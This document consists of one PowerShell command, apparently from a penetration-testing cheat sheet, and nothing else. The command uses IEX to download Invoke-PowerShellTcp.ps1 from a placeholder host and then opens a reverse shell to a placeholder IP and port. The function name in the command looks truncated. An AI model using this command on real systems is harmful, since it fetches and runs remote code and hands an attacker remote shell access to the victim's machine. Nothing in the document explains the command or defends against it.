powershell "IEX (New-Object Net.Webclient).downloadstring('http://<IP>/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress <IP> -Port <Port>"
